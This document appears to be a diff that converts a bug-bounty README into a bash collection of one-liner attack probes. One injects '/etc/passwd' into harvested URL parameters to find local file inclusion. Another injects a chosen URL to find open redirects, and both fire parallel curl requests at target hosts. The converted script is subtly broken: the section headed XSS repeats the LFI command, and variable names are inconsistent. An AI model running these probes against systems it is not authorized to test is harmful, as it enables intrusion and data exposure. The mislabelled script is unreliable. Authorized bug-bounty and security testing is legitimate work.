@@ -1,24 +1,24 @@
-# Awesome One-liner Bug Bounty
+#!/bin/bash
 
-# A collection of awesome one-liner scripts especially for bug bounty.
+# Bug Bounty One-liners Collection
+# A collection of optimized one-liner scripts for bug bounty hunting.
 
-# This repository stores and houses various one-liner for bug bounty tips provided by me as well as contributed by the community. Your contributions and suggestions are heartily welcome.
+# Definitions
+# HOST: hostname, (sub)domain, or IP address
+# HOSTS.txt: file containing multiple hosts
+# URL: full URL (e.g., http://domain.tld/path/page.html)
+# URLS.txt: file containing multiple URLs
+# FILE.txt: generic file placeholder
+# OUT.txt: output file placeholder
 
-## Definitions
+# Local File Inclusion
+gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" | grep -q "root:x" && echo "VULN! %"'
 
-This section defines specific terms or placeholders that are used throughout one-line command/scripts.
+# Open Redirect
+export LHOST="URL"
+gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" | grep -q "Location: $LHOST" && echo "VULN! %"'
 
-- 1.1. "HOST" defines one hostname, (sub)domain, or IP address, e.g. replaced by internal.host, domain.tld, sub.domain.tld, or 127.0.0.1.
-- 1.2. "HOSTS.txt" contains criteria 1.1 with more than one in file.
-- 2.1. "URL" definitely defines the URL, e.g. replaced by http://domain.tld/path/page.html or somewhat starting with HTTP/HTTPS protocol.
-- 2.2. "URLS.txt" contains criteria 2.1 with more than one in file.
-- 3.1. "FILE.txt" or "FILE{N}.txt" means the files needed to run the command/script according to its context and needs.
-- 4.1. "OUT.txt" or "OUT{N}.txt" means the file as the target storage result will be the command that is executed.
-
----
-
-### Local File Inclusion
-
+# XSS
 
 gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
 ### Open-redirect
